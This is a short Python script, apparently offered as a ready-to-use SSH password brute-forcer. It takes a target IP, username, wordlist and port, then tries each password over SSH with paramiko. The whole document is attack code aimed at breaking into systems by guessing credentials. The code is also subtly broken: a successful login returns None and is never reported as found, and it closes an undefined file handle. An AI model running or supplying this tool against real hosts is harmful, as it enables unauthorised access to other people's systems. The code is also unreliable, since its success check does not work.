#!/usr/bin/python3

import paramiko, sys, os
import threading

print("=========== SSH Brute Forcer ===========\n")

target = str(input("[*] Enter Target IP: "))
username = str(input("[*] Enter Target Username: "))
wordlist = str(input("[*] Enter Wordlist Path: "))
port = int(input("[*] Enter Port: "))
print("")

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target, port, username=username, password=password)

    except paramiko.AuthenticationException:
        code = 1
        ssh.close()
        return code

with open(wordlist, 'r') as file:
    for line in file.readlines():
        password = line.strip()

        try:
            response = ssh_connect(password)
        
            if response == 0:
                print('\n==============================\n')
                print ('[!!] Password Found: ' + password)
                print ("\n===============================\n")
                exit (0)

            elif response == 1:
                print ('[-] Not Found')

        except Exception as e:
            print (e)
        
        pass

    input_file.close()
